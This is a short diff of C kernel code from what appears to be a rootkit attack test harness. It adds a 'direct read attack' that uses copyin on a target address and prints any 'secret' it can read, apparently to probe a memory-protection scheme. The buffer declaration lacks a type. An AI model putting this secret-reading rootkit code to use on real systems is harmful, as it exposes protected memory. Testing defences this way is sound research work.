@@ -151,10 +151,25 @@ attackThread (struct thread * td) {
 //
 static void
 doAttack (struct thread * td) {
+  // Return value
+  int ret;
   switch (attackType) {
     // Direct read attack
-    case at_read:
+    case at_read: {
+      static buffer[SIZE];
+      ret = copyin (TARGET, buffer, SIZE); 
+      if (ret == EFAULT) {
+        printf ("Rootkit: EFAULT at %lx\n", TARGET);
+      } else {
+        unsigned index = 0;
+        printf ("Rootkit: Secret is");
+        for (index = 0; index < SIZE; ++index) {
+          printf ("%c", buffer[index]);
+        }
+        printf ("\n");
+      }
       break;
+    }
 
     // MMU attack
     case at_mmu:
